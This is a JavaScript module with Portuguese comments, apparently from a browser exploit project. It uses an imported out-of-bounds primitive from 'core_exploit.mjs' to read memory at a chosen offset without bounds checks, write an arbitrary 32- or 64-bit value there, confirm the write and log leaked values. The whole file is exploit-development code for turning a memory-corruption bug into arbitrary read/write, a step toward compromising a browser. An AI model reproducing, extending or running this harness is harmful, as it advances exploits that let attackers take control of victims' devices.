// js/script3/testReadWriteAtOffset.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

export async function executeReadWriteVerificationAtOffset(
    testDescription,
    offsetToProbe, 
    valueToWrite,    
    bytesToReadWrite // Geralmente 4 para DWORD, 8 para QWORD
) {
    const FNAME_TEST = `executeReadWriteVerification<${testDescription}>`;

    logS3(`--- Iniciando Teste R/W em Offset: ${testDescription} ---`, "test", FNAME_TEST);
    logS3(`   Alvo Offset: ${toHex(offsetToProbe)}, Valor a Escrever: ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)}, Bytes: ${bytesToReadWrite}`, "info", FNAME_TEST);
    document.title = `Iniciando R/W Test: ${testDescription}`;

    await triggerOOB_primitive(); 
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return;
    }
    document.title = "OOB Configurado";

    const initialOOBArrayBufferByteLength = oob_array_buffer_real.byteLength;
    logS3(`Tamanho de oob_array_buffer_real: ${initialOOBArrayBufferByteLength} bytes`, "info", FNAME_TEST);

    let stepReached = "inicio";
    let readOriginalValue = "N/A";
    let readValueAfterWrite = "N/A";
    let dvReadAfterWrite = "N/A";

    try {
        // 1. Ler o valor original no offset (sem verificação de limites)
        stepReached = "antes_leitura_original";
        document.title = `Lendo Original: ${testDescription}`;
        try {
            readOriginalValue = oob_read_absolute(offsetToProbe, bytesToReadWrite);
            logS3(`Valor ORIGINAL em ${toHex(offsetToProbe)} (${bytesToReadWrite}b): ${typeof readOriginalValue === 'object' ? readOriginalValue.toString(true) : toHex(readOriginalValue)}`, "leak", FNAME_TEST);
        } catch (e_read_orig) {
            logS3(`ERRO ao ler valor original em ${toHex(offsetToProbe)}: ${e_read_orig.message}`, "error", FNAME_TEST);
            readOriginalValue = `Erro: ${e_read_orig.message}`;
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3);

        // 2. Escrever o novo valor no offset (sem verificação de limites)
        stepReached = "antes_escrita_oob";
        document.title = `Escrevendo em ${toHex(offsetToProbe)}: ${testDescription}`;
        logS3(`Escrevendo valor ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)} em ${toHex(offsetToProbe)} (${bytesToReadWrite}b)...`, "warn", FNAME_TEST);
        // Serialize AdvancedInt64 para bytes se necessário
        let writeValue = valueToWrite;
        if (writeValue instanceof AdvancedInt64) {
            // Assume que oob_write_absolute pode lidar com AdvancedInt64 ou serialize para bytes
            writeValue = writeValue.toBytes(true); // Convertendo para little-endian, por exemplo
        }
        oob_write_absolute(offsetToProbe, writeValue, bytesToReadWrite);
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita em ${toHex(offsetToProbe)}: ${testDescription}`;
        await PAUSE_S3(MEDIUM_PAUSE_S3);

        // 3. Ler de volta o valor no offset para confirmar a escrita (sem verificação de limites)
        stepReached = "antes_leitura_confirmacao";
        document.title = `Lendo Confirmação: ${testDescription}`;
        try {
            readValueAfterWrite = oob_read_absolute(offsetToProbe, bytesToReadWrite);
            logS3(`Valor PÓS-ESCRITA em ${toHex(offsetToProbe)} (${bytesToReadWrite}b): ${typeof readValueAfterWrite === 'object' ? readValueAfterWrite.toString(true) : toHex(readValueAfterWrite)}`, "leak", FNAME_TEST);
            
            // Verificação precisa
            if (valueToWrite instanceof AdvancedInt64) {
                if (!valueToWrite.equals(readValueAfterWrite)) {
                    logS3("!!! VERIFICAÇÃO FALHOU: Valor lido difere do escrito (AdvancedInt64) !!!", "error", FNAME_TEST);
                } else {
                    logS3("Verificação OK (AdvancedInt64).", "good", FNAME_TEST);
                }
            } else {
                // Usar BigInt para comparações de 64-bit
                const writtenBigInt = BigInt(valueToWrite);
                const readBigInt = typeof readValueAfterWrite === 'bigint' ? readValueAfterWrite : BigInt(readValueAfterWrite);
                if (writtenBigInt !== readBigInt) {
                    logS3(`!!! VERIFICAÇÃO FALHOU: Valor lido (${toHex(readBigInt)}) difere do escrito (${toHex(writtenBigInt)}) !!!`, "error", FNAME_TEST);
                } else {
                    logS3("Verificação OK (numérico).", "good", FNAME_TEST);
                }
            }
        } catch (e_read_confirm) {
            logS3(`ERRO ao ler valor de confirmação em ${toHex(offsetToProbe)}: ${e_read_confirm.message}`, "error", FNAME_TEST);
            readValueAfterWrite = `Erro: ${e_read_confirm.message}`;
        }
        stepReached = "apos_leitura_confirmacao";
        document.title = `Após Leitura Confirmação: ${testDescription}`;
        await PAUSE_S3(MEDIUM_PAUSE_S3);

        // 4. Testar oob_dataview_real (opcional, removido se não relevante)
        stepReached = "antes_teste_dv";
        document.title = `Testando DataView: ${testDescription}`;
        try {
            if (oob_dataview_real) {
                let dvTestRead = oob_dataview_real.getUint32(0, true);
                dvReadAfterWrite = `Lido ${toHex(dvTestRead)} de oob_dataview_real[0]`;
                logS3(`Leitura de teste da oob_dataview_real[0]: ${toHex(dvTestRead)}`, "good", FNAME_TEST);
            } else {
                dvReadAfterWrite = "oob_dataview_real nulo";
                logS3("AVISO: oob_dataview_real é nulo.", "warn", FNAME_TEST);
            }
        } catch (e_dv) {
            dvReadAfterWrite = `Erro ao ler oob_dataview_real[0]: ${e_dv.message}`;
            logS3(`ERRO ao ler oob_dataview_real[0]: ${e_dv.message}`, "error", FNAME_TEST);
        }
        stepReached = "apos_teste_dv";
        document.title = `DataView Testada: ${testDescription}`;

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal R/W Test: ${testDescription}`;
        logS3(`Erro principal no teste R/W em Offset (${testDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
    }
    logS3(`--- Teste R/W em Offset Concluído: ${testDescription} ---`, "test", FNAME_TEST);
    logS3(`   Resultados: Original=${typeof readOriginalValue === 'object' ? readOriginalValue.toString(true) : toHex(readOriginalValue)}, Pós-Escrita=${typeof readValueAfterWrite === 'object' ? readValueAfterWrite.toString(true) : toHex(readValueAfterWrite)}, Leitura Final DV=${dvReadAfterWrite}`, "info", FNAME_TEST);
    
    document.title = `Teste R/W Concluído: ${testDescription}`;
}
